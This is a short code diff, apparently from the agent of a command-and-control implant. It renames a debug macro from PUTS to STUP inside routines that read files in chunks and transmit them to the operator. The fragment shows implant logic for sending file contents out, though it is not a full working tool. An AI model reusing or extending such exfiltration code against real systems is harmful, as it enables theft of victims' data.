@@ -45,7 +45,7 @@ VOID DownloadFree( PDOWNLOAD_DATA Download )
         SysNtClose( Download->hFile );
     }
 
-    PUTS( "Free download object" )
+    STUP( "Free download object" )
 
     /* Now free the struct */
     MemSet( Download, 0, sizeof( DOWNLOAD_DATA ) );
@@ -148,7 +148,7 @@ VOID DownloadPush()
             /* Send chunk we read */
             if ( Read > 0 )
             {
-                PUTS( "Send download chunk" )
+                STUP( "Send download chunk" )
 
                 Package = PackageCreateWithRequestID( DEMON_COMMAND_FS, Download->RequestID );
 
@@ -161,7 +161,7 @@ VOID DownloadPush()
                 PackageAddBytes( Package, Instance->DownloadChunk.Buffer, Read );
 
                 /* Send that chunk */
-                PUTS( "transmit download chunk" )
+                STUP( "transmit download chunk" )
                 PackageTransmit( Package );
             }
 
